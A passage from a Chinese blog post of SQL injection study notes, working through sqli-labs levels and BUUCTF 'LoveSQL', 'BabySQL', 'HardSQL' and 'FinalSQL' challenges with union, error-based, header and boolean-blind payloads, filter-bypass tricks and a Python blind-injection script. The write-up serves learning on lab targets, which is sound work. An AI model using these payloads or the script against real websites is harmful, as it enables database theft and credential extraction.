post_test\less15.txt <span class="comment">--technique B -dbs</span></span><br></pre></td></tr></table></figure><hr><h4 id="Less16："><a href="#Less16：" class="headerlink" title="Less16："></a>Less16：</h4><p>输入下列内容，成功。双引号加括号闭合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&quot;) or 1=1#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732167944445-406cf7a8-5ad1-4bd3-b17e-952ee0f66a82.png" referrerpolicy="no-referrer"></p><h3 id="Less17-Less18（报错注入）"><a href="#Less17-Less18（报错注入）" class="headerlink" title="Less17-Less18（报错注入）"></a>Less17-Less18（报错注入）</h3><h4 id="Less17："><a href="#Less17：" class="headerlink" title="Less17："></a>Less17：</h4><p><strong>在笔记里写过了，不多说了</strong></p><h4 id="Less18：-UA-头注入"><a href="#Less18：-UA-头注入" class="headerlink" title="Less18：(UA 头注入)"></a>Less18：(UA 头注入)</h4><p>测试闭合一直没测试出来</p><p>用之前拿到的账号密码测试，出现回显是 UA 头，怀疑是 UA 头注入</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732259352675-12809c24-137b-424f-a58b-e734398a9bb6.png" referrerpolicy="no-referrer"></p><p>抓包在 UA 头后面加个单引号，报错了，看来这就是注入点</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732259499980-a0c75c80-161a-44cd-8867-999731bf6cba.png" referrerpolicy="no-referrer"></p><p>测试闭合，是两个双引号闭合</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732259689878-0fd57c00-91db-4ed6-a2b4-ec0b5c95b47d.png" referrerpolicy="no-referrer"></p><p>在 UA 头里注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and updatexml(1,concat(1,database()),2) and&#x27;</span></span><br><span class="line"><span class="string">&#x27;and updatexml(1,concat(1,(select group_concat(schema_name) from information_schema.schemata)),2) and&#x27;</span></span><br><span class="line"><span class="string">&#x27;and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctftraining<span class="string">&#x27;)),2) and&#x27;</span></span><br><span class="line"><span class="string">&#x27;and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;)),2) and&#x27;</span></span><br><span class="line"><span class="string">&#x27;and updatexml(1,concat(1,(select group_concat(flag) from ctftraining.flag)),2) and&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732261348530-7eccd00a-3d23-49bb-9bbf-98ec8f0f4c9d.png" referrerpolicy="no-referrer"></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>有登录框</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732272145692-f338b707-5c49-42cd-928e-1984268c02f3.png" referrerpolicy="no-referrer"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string"># 回显成功，单引号闭合</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732272403344-6bd58aea-9ee9-4d74-94e0-4c1835e3b9c3.png" referrerpolicy="no-referrer"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(database())#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;geek&#x27;</span>#</span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(password) <span class="keyword">from</span> l0ve1ysq1#</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732273124288-5a253b60-7f68-41ee-8dd5-e1db45c7df0a.png" referrerpolicy="no-referrer"></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>输入万能公式，都没反应</p><p>直接注吧，过滤了 or 和 by</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275065300-453f8022-c6de-49d9-86d0-b12d7b03acf9.png" referrerpolicy="no-referrer"></p><p>试试联合注入 union 和 select 都被过滤了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select group_concat(table_name) from information_schema.tables#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275387806-76d7771c-5d26-4388-8cf8-eaafbab7a126.png" referrerpolicy="no-referrer"></p><p>试试双写绕过，可以。就是字段数不一样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; ununionion selselectect group_concat(database())#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275772022-cc58a8ae-648f-433d-b393-4a4a176839a8.png" referrerpolicy="no-referrer"></p><p>3 个字段可以</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; ununionion selselectect 1,2,group_concat(database())#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275862952-e3110abf-2da9-42af-bd9e-843b1a17093e.png" referrerpolicy="no-referrer"></p><p>下一步看出from， where 被过滤了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>geek<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732275979049-78f0b705-dfe4-4a29-8449-0515ccbda90e.png" referrerpolicy="no-referrer"></p><p>双写</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema=&#x27;</span>geek<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276289917-022b9618-6981-454c-8afa-aeadd72509fd.png" referrerpolicy="no-referrer"></p><p>下一步</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#x27;</span>b4bsql<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276368374-59f71a49-b46d-40a5-8994-bf5dc00371a5.png" referrerpolicy="no-referrer"></p><p>最后一步</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; ununionion selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732276535343-23e61381-dcd4-421c-90ae-6ad1d5a8fe1b.png" referrerpolicy="no-referrer"></p><h2 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h2><p>发现好多关键字和符号都被过滤了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732278569110-54a6caad-aa59-441b-8adf-c2ccce234b6b.png" referrerpolicy="no-referrer"></p><p>尝试报错注入,and 和空格被过滤了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732279437112-440fb8bf-cc97-488d-a873-e1c79cbe4f75.png" referrerpolicy="no-referrer"></p><p>等于号被过滤了，用 like 替代</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;)),0x7e),1))#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280011054-7149e318-f20a-4dba-886c-9cf6543d46f8.png" referrerpolicy="no-referrer"></p><p>爆表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280296909-662a72fb-565e-4f57-9c96-6a513a87136f.png" referrerpolicy="no-referrer"></p><p>爆 flag 前半段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280457483-61e56ef5-5a78-4651-9783-d6d4646676c3.png" referrerpolicy="no-referrer"></p><p>并不完整，借助 right 函数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">right</span>()：顾名思义就是从右边截取字符串。</span><br><span class="line"># 用法：<span class="keyword">right</span>(str, length)，即：<span class="keyword">right</span>(被截取字符串， 截取长度)</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732280998389-ab412ac8-881d-41ff-952d-7d99c9e2961d.png" referrerpolicy="no-referrer"></p><h2 id="极客大挑战-2019-FinalSQL-1"><a href="#极客大挑战-2019-FinalSQL-1" class="headerlink" title="[极客大挑战 2019]FinalSQL 1"></a>[极客大挑战 2019]FinalSQL 1</h2><p>刚进来，很懵逼</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732358929013-83ad1a61-cf25-4a5a-b3c1-b53e63ad4866.png" referrerpolicy="no-referrer"></p><p>把 5 个选项都点了，结果如下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732358976121-efb22354-32c6-47c4-a318-5ea7c6f9dd98.png" referrerpolicy="no-referrer"><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732358982212-c407fb5b-fbfc-45e3-846b-13530a311c5c.png" referrerpolicy="no-referrer"><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732358999709-f4c9865d-0309-4cde-99fb-06fe2af3da9c.png" referrerpolicy="no-referrer"><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732359009285-ed858391-beaf-483c-9230-45b55798403b.png" referrerpolicy="no-referrer"><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732359014336-5133df9c-b4ab-48c4-af6a-ef0e3a2d01d1.png" referrerpolicy="no-referrer"></p><p>懵了，看看源码。注释了一个参数为 id 的文本框，而且 5 个界面的 url 里也写了 id 参数。这应该是注入点</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732359056732-ed2dc769-e9dd-4be1-a8d5-035de2302463.png" referrerpolicy="no-referrer"></p><p>试试，有反应。但是不是一个表<img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732359221213-b17b612a-11a0-4fd6-9a72-87b8079e71d8.png" referrerpolicy="no-referrer"></p><p>因为这个 id&#x3D;1 和 id&#x3D;0 界面不一样，以此为基础，进行布尔盲注，and 和 or ，空格被过滤了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732360607552-38a4a9f9-ad97-45e2-b171-d0f08cf75417.png" referrerpolicy="no-referrer"></p><p>用异或符试试</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732360653617-f0e37762-e629-4d5e-a393-9d8fb64be42b.png" referrerpolicy="no-referrer"><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732360669611-700af3a7-0ec1-48b8-9ea9-3f43dd7e588d.png" referrerpolicy="no-referrer"></p><p>可以，接下来构造语句</p><p>原理</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">^</span><span class="number">1</span><span class="operator">^</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">1</span><span class="operator">^</span><span class="number">1</span><span class="operator">^</span><span class="number">0</span><span class="operator">=</span><span class="number">0</span></span><br></pre></td></tr></table></figure><p>是第三个布尔盲注的语句，进行尝试，根据结果判断真假</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span><span class="number">1</span><span class="operator">^</span>(ascii(substr((<span class="keyword">select</span>(group_concat(schema_name))<span class="keyword">from</span>(information_schema.schemata)),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">105</span>)</span><br></pre></td></tr></table></figure><p>粘个别人写的脚本，用了二分法，比我写的效率高多了（读代码的想法在注释和代码后面）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://ab82d2b2-e78c-4cbf-a6a4-719d50adefac.node5.buuoj.cn:81/search.php?&quot;</span><br><span class="line">temp = &#123;&quot;id&quot;: &quot;&quot;&#125;</span><br><span class="line">column = &quot;&quot;</span><br><span class="line">for i in range(1, 1000):</span><br><span class="line">    time.sleep(0.06)</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) // 2</span><br><span class="line">    while (low &lt; high):</span><br><span class="line">        # 库名</span><br><span class="line">        temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (i, mid)</span><br><span class="line">        # 表名</span><br><span class="line">        # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        # 字段名</span><br><span class="line">        # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        # 内容</span><br><span class="line">        # temp[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        r = requests.get(url, params=temp)</span><br><span class="line">        time.sleep(0.04)</span><br><span class="line">        print(low, high, mid, &quot;:&quot;)</span><br><span class="line">        # 二分法</span><br><span class="line">        if &quot;Click&quot; in r.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">        # 不进行长度判断，而使代码停下的关键</span><br><span class="line">        # 超过长度之后，所有的页面都是error，最终mid为32，使代码停下</span><br><span class="line">        # 后面的mid==127不太明白意思</span><br><span class="line">    if (mid == 32 or mid == 127):</span><br><span class="line">        break</span><br><span class="line">    column += chr(mid)</span><br><span class="line">    print(column)</span><br><span class="line"></span><br><span class="line">print(&quot;All:&quot;, column)</span><br></pre></td></tr></table></figure><blockquote><p>读了代码，写一下思路</p><p>1.没有进行长度判断，减少步骤</p><p>2.利用二分法判断 ascii 码值,减少步骤;</p><p>3.32 到 128 正好是字符的 ascii 值范围,也提高效率</p></blockquote><p>粘一下结果</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732361554511-1be98a24-baba-4d07-9bc7-ec5c046e24d6.png" referrerpolicy="no-referrer"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732361667569-af8f04ef-e417-43ba-b19f-ab9d9e05563f.png" referrerpolicy="no-referrer"><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1732362702605-13c54c39-ae54-4684-9a09-ea786296e4db.png" referrerpolicy="no-referrer"></p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://dre4m1nd.github.io">Dre4m1nd</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://dre4m1nd.github.io/2024/11/24/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">http://dre4m1nd.github.io/2024/11/24/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://dre4m1nd.github.io" target="_blank">Dre4m1nd</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post-share"><div class="social-share" data-image="/img/Dre4m1nd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2024/11/17/BaseCTF2024-web/" title="BaseCTF2024-web"><div class="cover" style="background:var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">BaseCTF2024-web</div></div><div class="info-2"><div class="info-item-1">week1喵喵喵´•ﻌ•&#96;考点：eval（）函数： eval() 函数把字符串按照 PHP 代码来计算。 该字符串必须是合法的 PHP 代码，且必须以分号结尾。 system()函数 php 代码不能直接执行 shell 命令，还需要借助 system （）函数 题解：进入题目，源码如下 12345678910111213&lt;?php// 高亮显示当前文件内容，方便调试和查看代码结构highlight_file(__FILE__);// 关闭错误报告error_reporting(0);// 获取 GET 请求中的参数 &#x27;DT&#x27; 的值，并赋值给变量 $a$a = $_GET[&#x27;DT&#x27;];// 使用 eval 函数执行 $a 中的代码，这是非常危险的操作，因为可以执行任意用户输入的代码，可能导致安全漏洞eval($a);?&gt; md5绕过欸考点：弱类型比较（&#x3D;&#x3D;）： 弱类型比较，两个不同类型比较时，会自动转换成相同类型后再比较值 if(“admin”&#x3D;&#x3D;0)...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Dre4m1nd.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info-name">Dre4m1nd</div><div class="author-info-description">Dre4m1nd的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Dre4m1nd"><i class="fab fa-github"></i><span>进入github主页</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Dre4m1nd" target="_blank" title="Github"><i class="fab fa-github" style="color:#24292e"></i></a><a class="social-icon" href="mailto:2976587697@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color:#4a7dbe"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">web小白</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E3%80%81sqli-labs-%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E5%AE%89%E8%A3%85"><span class="toc-number">1.</span> <span class="toc-text">一 、sqli-labs 本地靶场安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-phpstudy-%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">1.phpstudy 安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8B%E8%BD%BD-sqli-labs-%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">2 下载 sqli-labs 源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">3.修改配置文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BA%86%E8%A7%A3-SQL"><span class="toc-number">2.</span> <span class="toc-text">二、了解 SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">2.1.</span> <span class="toc-text">SQL 的定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E8%AF%AD%E6%B3%95%E8%A6%81%E6%B1%82"><span class="toc-number">2.2.</span> <span class="toc-text">SQL 语法要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%A7%8D%E7%B1%BB"><span class="toc-number">2.3.</span> <span class="toc-text">数据库的种类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.3.1.</span> <span class="toc-text">常见的关系型数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.3.2.</span> <span class="toc-text">常见的非关系型数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">2.3.3.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BA%86%E8%A7%A3-MySQL-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">三、了解 MySQL 基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E7%A7%8D%E8%AF%AD%E5%8F%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.</span> <span class="toc-text">四种语句类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DDL%EF%BC%88%E6%95%B0%E6%8D%AE%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">DDL（数据定义语言）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.1.</span> <span class="toc-text">数据库操作</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.2.</span> <span class="toc-text">表操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DML%EF%BC%88%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C%E8%AF%AD%E8%A8%80%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">DML（数据操作语言）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E6%95%B0%E6%8D%AE"><span class="toc-number">3.3.1.</span> <span class="toc-text">添加数据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E5%92%8C%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE"><span class="toc-number">3.3.2.</span> <span class="toc-text">更新和删除数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DQL%EF%BC%88%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">DQL（数据查询语言）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.4.1.</span> <span class="toc-text">基础查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.4.2.</span> <span class="toc-text">条件查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%9A%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%88%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0%EF%BC%89"><span class="toc-number">3.4.3.</span> <span class="toc-text">聚合查询（聚合函数）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.4.4.</span> <span class="toc-text">分组查询</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-2"><span class="toc-number">3.4.4.1.</span> <span 